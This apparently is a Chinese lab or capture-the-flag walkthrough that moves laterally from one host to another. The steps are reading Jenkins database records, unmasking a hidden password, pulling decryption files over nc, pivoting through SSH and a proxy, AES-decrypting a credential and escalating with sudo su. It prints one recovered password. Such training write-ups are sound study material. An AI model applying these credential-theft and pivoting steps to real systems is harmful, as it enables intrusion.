可以看到30主机是有jenkins，这是一种监控配置文件，里面可能存一些配置性文件。这里是有数据库配置性文件，里面找到了连接50的数据库的操作记录，

![1734272015168](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942369.png)

然后30这边的网页打开发现da数据库，这里就猜测是与50目标机有关，因为上面30机尝试连接过50的mysql。

![1734272141712](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942370.png)

1h  前端更改隐藏密码功能，还需要解密，需要三个文件。

点进去db_backup然后发现有账号密码：

![1734272289584](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942371.png)

先去除密码隐藏，只需要将上面的password置空即可：

![1734272361165](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942372.png)

 这里就得用nc监听30让他主动给出来文件,让进行解密。解密后进行连接50就行

上面得到的密码就是jenkins的加密算法，需要解密3个文件进行解密：

这里刚才的没ssh连接成功30又回来了，用本地机器连接（这里代理没有断），但是报错一直Permission denied, please try again.管理员打开cmd也不行，最后才是这样，怪不得在kali中也只是给他0600 的权限，不给777，因为这里这个id_rsa文件（是刚才在10上获取连接30的密钥文件）权限设置得太开放，SSH 客户端要求私钥文件不能被其他用户访问。

所以下面这样让文件只允许一个人（本地用户）访问---（这类文件应该都一样）

![1734273694441](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942373.png)

成功：

![1734273884074](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942374.png)

那么这里就用本地作为中转，这里代理好后可以和攻击机和目标机都能通讯：

![1734274219512](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942375.png)

下来接着上面的解密，已经得到了解密的密码，需要3个解密文件。获取：

![1734274452407](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942376.png)

解密需要的py环境也难配置，一直报这个Crtpto，最后需要安装pycrptodome模板，有时候报错将脚本的导入from Crypto.Cipher import AES语句扔给gpt，他能知道你需要下载的是哪个脚本：

![1734275284369](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942377.png)

解密得到的3个解密文件，得到了最后的密码---用py解密出来的文件如果是这样：     b'asdasd'   这里是密码应该是asdasd   因为py解密出来的前面的b是bit字节流的意思  ，所以这里的b')uDvra{4UL^;r?*h'   最后的密码就是：       	)uDvra{4UL^;r?*h   ：

![1734275429367](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942378.png)

用密码连接50，这里的用户就是刚才30网站得到的db_backup的用户名：

![1734275839162](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942379.png)

![1734275857031](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942380.png)

提权没有设置难度，直接就是sudo su   （这是提到最高权限的命令，而不是su root）.....：

![1734275991667](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942381.png)


